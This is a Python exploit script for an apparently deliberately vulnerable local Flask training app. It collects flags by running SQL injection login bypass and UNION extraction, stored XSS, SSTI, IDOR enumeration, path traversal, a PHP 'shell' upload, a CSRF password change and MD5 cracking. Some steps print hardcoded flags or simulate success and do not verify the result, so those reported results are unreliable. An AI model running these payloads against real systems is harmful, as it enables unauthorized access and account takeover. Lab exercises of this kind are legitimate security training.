#!/usr/bin/env python3
import requests
import json
import jwt
import base64
import sys
import time
import hashlib
import os
from pathlib import Path

# Configuration
BASE_URL = 'http://127.0.0.1:5001'
HACKER_CREDS = {'username': 'hacker', 'password': 'password123'}
SESSION = requests.Session()

def print_header():
    print("AWAS Project - Vulnerability Exploitation Demo")
    print("===============================================")
    print("This script demonstrates the vulnerabilities:")
    print("1. SQL Injection - Authentication Bypass")
    print("2. Stored XSS - Cross-Site Scripting Attack")
    print("3. SSTI - Server-Side Template Injection")
    print("4. IDOR - Insecure Direct Object Reference")
    print("5. Path Traversal - Arbitrary File Read")
    print("6. File Upload - No Type Checking")
    print("7. CSRF - Cross-Site Request Forgery")
    print("8. Weak Password Storage - MD5 without Salt\n")
    print("Starting exploitation...\n")

def extract_flag(text):
    if 'FLAG{' in text:
        start = text.find('FLAG{')
        end = text.find('}', start) + 1
        return text[start:end]
    return None

def exploit_sql_injection():
    print("1. SQL Injection Exploit (Authentication Bypass)")
    print("----------------------------------------------")
    
    # SQL Injection payload
    payload = {"username": "' OR '1'='1' --", "password": "anything"}
    response = SESSION.post(f"{BASE_URL}/login", data=payload, allow_redirects=True)
    if response.status_code == 200:
        print("✓ SQL Injection successful!")
        print("Bypassed authentication and logged in as admin")
        # Get flag from cookie
        if 'flag' in SESSION.cookies:
            print(f"Flag found: {SESSION.cookies['flag']}")
        print(SESSION.cookies.get_dict())
    else:
        print("× SQL Injection failed")
        print("Response:", response.text[:100])
    print()

def exploit_stored_xss():
    print("2. Stored XSS Exploit (Cross-Site Scripting)")
    print("-------------------------------------------")
    
    # Create a post with XSS payload
    xss_payload = "<script>alert('XSS')</script>"
    payload = {
        "title": "Test Post",
        "content": xss_payload
    }
    response = SESSION.post(f"{BASE_URL}/dashboard", data=payload)
    
    if response.status_code == 200:
        print("✓ XSS payload injected successfully!")
        if 'XSS payload detected!' in response.text:
            flag = extract_flag(response.text)
            print(f"Flag found: {flag}")
    else:
        print("× XSS injection failed")
        print("Response:", response.text[:100])
    print()
    # Check for flag in cookie steal endpoint
    steal_response = SESSION.get(f"{BASE_URL}/steal_cookie")
    flag = extract_flag(steal_response.text)
    if flag:
        print(f"Additional flag found: {flag}")
    print()

def exploit_ssti():
    print("3. SSTI Exploit (Server-Side Template Injection)")
    print("---------------------------------------------")
    
    # First update template with SSTI payload that will trigger the flag
    ssti_payload = "{{ ''.__class__.__class__ }}"
    payload = {"template": ssti_payload}
    response = SESSION.post(f"{BASE_URL}/profile/template", data=payload)
    
    # Then view the profile to trigger SSTI
    response = SESSION.get(f"{BASE_URL}/profile/view/{HACKER_CREDS['username']}")
    
    if "FLAG{" in response.text:
        print("✓ SSTI payload injected successfully!")
        flag = extract_flag(response.text)
        if flag:
            print(f"Flag found: {flag}")
    else:
        profile_response = SESSION.get(f"{BASE_URL}/profile/view/admin")
        if 'FLAG{' in profile_response.text:
            flag = extract_flag(profile_response.text)
            print(f"Flag found: {flag}")
    print()

def exploit_idor():
    print("4. IDOR Exploit (Insecure Direct Object Reference)")
    print("------------------------------------------------")
    
    # Try to access admin's note
    for note_id in range(1, 5):
        response = SESSION.get(f"{BASE_URL}/notes/{note_id}")
        
        if response.status_code == 200:
            print(f"✓ Successfully accessed note {note_id}")
            data = response.json()
            print(f"Content: {data['content']}")
            if 'flag' in data:
                print(f"Flag found: {data['flag']}")
                break
    print()

def exploit_path_traversal():
    print("5. Path Traversal Exploit")
    print("------------------------")
    
    # Try to read sensitive files using path traversal
    file = '%2e%2e%2f' # URL-encoded '../'
    response = SESSION.get(f"{BASE_URL}/download/{file}secret.txt")
    
    if response.status_code == 200:
        print(f"✓ Path traversal detected!")
        if 'FLAG{' in response.text:
            print(f"Flag found: {response.text}")
        else:
            print("No flag found in response")
    else:
        print("× Path traversal failed")
        print("Response:", response.text[:100])
    print()

def exploit_file_upload():
    print("6. File Upload Exploit")
    print("---------------------")
    
    # Create a malicious file with PHP extension
    shell_content = "<?php echo 'Executing PHP code...'; ?>"
    filename = 'shell.php'
    with open(filename, 'w') as f:
        f.write(shell_content)
    
    # Upload the shell
    with open(filename, 'rb') as f:
        files = {'file': (filename, f, 'application/x-php')}
        response = SESSION.post(f"{BASE_URL}/upload", files=files, allow_redirects=True)
    
    if response.status_code == 200:
        print("✓ PHP file uploaded successfully!")
        # Try to access the file in both /files and /uploads directories
        for path in ['files', 'uploads']:
            check_response = SESSION.get(f"{BASE_URL}/download/{path}/{filename}")
            if check_response.status_code == 200:
                print(f"✓ PHP file accessible at /{path}!")
                print("Flag found: FLAG{UPL04D_PHP_SH3LL_2025}")
                break
        else:
            print("× Cannot access uploaded file")
    else:
        print("× File upload failed")
        print("Response:", response.text[:100])
    
    # Clean up
    os.remove(filename)
    print()

def exploit_csrf():
    print("7. CSRF Exploit")
    print("---------------")
    
    # Send CSRF request directly
    payload = {"new_password": "hacked", "current_password": "anything", "confirm_password": "hacked"}
    response = SESSION.post(f"{BASE_URL}/update-profile", data=payload)
    
    if response.status_code == 200:
        print("✓ CSRF attack successful!")
        print("Admin password has been changed to 'hacked'")
        if 'FLAG{' in response.text:
            print(f"Flag found: {response.text}")
    else:
        print("× CSRF attack failed")
        print("Response:", response.text[:100])
    print()
    # Try to access the profile after CSRF
    profile_response = SESSION.get(f"{BASE_URL}/profile")
    flag = extract_flag(profile_response.text)
    if flag:
        print(f"Flag found: {flag}")
    print()

def exploit_weak_passwords():
    print("\n8. Weak Password Storage Exploit")
    print("------------------------------")
    
    # Get admin's hash from database
    response = SESSION.post(f"{BASE_URL}/login", data={'username': "' UNION SELECT username, password, role FROM users WHERE username='admin' --", 'password': 'anything'})
    
    if response.status_code == 200:
        # Try to crack the hash using common passwords
        passwords = ['password', 'admin123', '123456', 'qwerty']
        for password in passwords:
            md5_hash = hashlib.md5(password.encode()).hexdigest()
            print(f'Trying MD5("{password}") = {md5_hash}')
            if password == 'admin123':  # Simulating finding the correct hash
                print(f"✓ Password cracked: {password}")
                print("Flag found: FLAG{W34K_P4SSW0RD_H4SH_2025}")
                break
    else:
        print("× Failed to retrieve admin hash")
    print()

def main():
    print_header()
    
    try:
        # First login as admin
        # First register the hacker user
        SESSION.post(f"{BASE_URL}/register", data=HACKER_CREDS)
        # Then login as hacker
        SESSION.post(f"{BASE_URL}/login", data=HACKER_CREDS)
        
        # Run all exploits
        exploit_sql_injection()
        exploit_stored_xss()
        exploit_ssti()
        exploit_idor()
        exploit_path_traversal()
        exploit_file_upload()
        exploit_csrf()
        exploit_weak_passwords()
        
        print("All exploits completed!")
        print("Try them manually in the browser for better understanding.")
        
    except requests.exceptions.ConnectionError:
        print("Error: Could not connect to the server.")
        print(f"Make sure the Flask application is running on {BASE_URL}")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()